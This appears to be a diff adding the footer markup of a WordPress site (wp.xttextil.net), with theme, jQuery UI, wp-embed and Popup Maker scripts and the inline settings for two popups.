+<script type='text/javascript' src='http://wp.xttextil.net/wp-content/themes/xttextil/js/skip-link-focus-fix.js?ver=20151215' id='xttextil-skip-link-focus-fix-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4' id='jquery-ui-core-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4' id='jquery-ui-position-js'></script>
+<script type='text/javascript' id='popup-maker-site-js-extra'>
+/* <![CDATA[ */
+var pum_vars = {"version":"1.11.2","pm_dir_url":"http:\/\/wp.xttextil.net\/wp-content\/plugins\/popup-maker\/","ajaxurl":"http:\/\/wp.xttextil.net\/wp-admin\/admin-ajax.php","restapi":"http:\/\/wp.xttextil.net\/wp-json\/pum\/v1","rest_nonce":null,"default_theme":"1297","debug_mode":"","disable_tracking":"","home_url":"\/","message_position":"top","core_sub_forms_enabled":"1","popups":[]};
+var ajaxurl = "http:\/\/wp.xttextil.net\/wp-admin\/admin-ajax.php";
+var pum_sub_vars = {"ajaxurl":"http:\/\/wp.xttextil.net\/wp-admin\/admin-ajax.php","message_position":"top"};
+var pum_popups = {"pum-9439":{"disable_on_mobile":false,"disable_on_tablet":false,"custom_height_auto":false,"scrollable_content":false,"position_from_trigger":false,"position_fixed":false,"overlay_disabled":false,"stackable":false,"disable_reposition":false,"close_on_form_submission":false,"close_on_overlay_click":false,"close_on_esc_press":false,"close_on_f4_press":false,"disable_form_reopen":false,"disable_accessibility":false,"theme_id":"1297","size":"medium","responsive_min_width":"0%","responsive_max_width":"100%","custom_width":"640px","custom_height":"380px","animation_type":"fade","animation_speed":"350","animation_origin":"center top","open_sound":"none","custom_sound":"","location":"center top","position_top":"100","position_bottom":"0","position_left":"0","position_right":"0","zindex":"1999999999","close_button_delay":"0","close_on_form_submission_delay":"0","triggers":[],"cookies":[],"theme_slug":"default-theme","id":9439,"slug":"programacao"},"pum-6780":{"disable_on_mobile":false,"disable_on_tablet":false,"custom_height_auto":false,"scrollable_content":false,"position_from_trigger":false,"position_fixed":false,"overlay_disabled":false,"stackable":false,"disable_reposition":false,"close_on_form_submission":false,"close_on_overlay_click":true,"close_on_esc_press":true,"close_on_f4_press":true,"disable_form_reopen":false,"disable_accessibility":false,"triggers":[{"type":"auto_open","settings":{"cookie_name":["pum-6780"],"delay":"500"}}],"cookies":[{"event":"on_popup_close","settings":{"name":"pum-6780","key":"","session":false,"time":"1 month","path":"1"}}],"theme_id":"1297","size":"medium","responsive_min_width":"0%","responsive_max_width":"100%","custom_width":"640px","custom_height":"380px","animation_type":"fade","animation_speed":"350","animation_origin":"center top","open_sound":"none","custom_sound":"","location":"center top","position_top":"100","position_bottom":"0","position_left":"0","position_right":"0","zindex":"1999999999","close_button_delay":"0","close_on_form_submission_delay":"0","theme_slug":"default-theme","id":6780,"slug":"15-anos-2"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='//wp.xttextil.net/wp-content/uploads/pum/pum-site-scripts.js?defer&#038;generated=1671741801&#038;ver=1.11.2' id='popup-maker-site-js'></script>
+<script type='text/javascript' src='http://wp.xttextil.net/wp-includes/js/wp-embed.min.js?ver=5.5.12' id='wp-embed-js'></script>
+<script type="text/javascript">document.body.className = document.body.className.replace("siteorigin-panels-before-js","");</script>  </body>
+</html>
